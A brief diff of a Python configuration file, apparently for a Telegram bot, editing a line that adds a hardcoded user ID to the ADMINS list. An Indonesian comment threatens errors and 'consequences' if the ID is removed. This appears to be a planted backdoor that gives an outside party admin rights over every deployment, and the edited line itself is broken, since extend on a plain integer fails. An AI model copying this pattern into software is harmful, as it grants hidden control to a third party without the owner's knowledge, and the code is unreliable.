@@ -67,7 +67,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
-ADMINS.extend((5846009927))
+ADMINS.extend(5846009927)
 
 
 LOG_FILE_NAME = "logs.txt"
